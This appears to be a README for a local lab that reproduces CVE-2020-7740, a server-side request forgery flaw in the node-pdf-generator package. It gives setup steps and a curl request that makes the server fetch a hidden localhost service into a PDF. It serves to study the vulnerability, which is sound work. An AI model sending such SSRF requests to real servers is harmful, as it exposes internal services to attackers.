# CVE-2020-7740

This affects all versions of package [`node-pdf-generator`](https://github.com/darrenhaken/node-pdf-generator). Due to lack of user input validation and sanitization done to the content given to node-pdf-generator, it is possible for an attacker to craft a url that will be passed to an external server allowing an SSRF attack.

[Source](https://nvd.nist.gov/vuln/detail/CVE-2020-7740)

## Quick start with docker

1. Build the container with
2. Run the container with `docker run -p 3000:3000 cve-2020-7740`
3. Notice that we cannot visit [`localhost:3001`](http://localhost:3001) directly
4. Send the request with curl using `curl --location --request GET localhost:3000/test --data-raw http://localhost:3001 --output test.pdf`
5. View `test.pdf` to view the localhost website that is supposed to be hidden.

## Quick start Without docker

1. Clone the project using `git clone {link to be inserted}`
2. Install the dependencies from `https://wkhtmltopdf.org/`
3. Start the server using `node .\NodePdfGeneratorServer` the server will be running at `localhost:3000`
4. Install the requirements of the hidden python server using `python3 -m pip install -r requirements.txt`
5. Start the hidden server using `python3 HiddenService` the server will be running at ['localhost:3001`](http://localhost:3001)

## How does it work?

1. A get request with a body is sent to the server. This can be sent using `curl --location --request GET localhost:3000/test --data-raw http://www.google.com --output test.pdf`
2. This will save a copy of the html page of `http://www.google.com` to the file `test.pdf`

## Why is it vulnerable?

1. Other URLs that is fed to the server will be visited by the server in order for it to convert the website to pdf.
2. This allows the user forge a server request by giving the server an internal IP address for it to target.

## More information on the CVE-2020-7740

1. [Vicarius.io](https://www.vicarius.io/research-center/vulnerability/cve-2020-7740-id264841)
2. [NVD](https://nvd.nist.gov/vuln/detail/CVE-2020-7740)
3. [Original Repository](https://github.com/darrenhaken/node-pdf-generator)
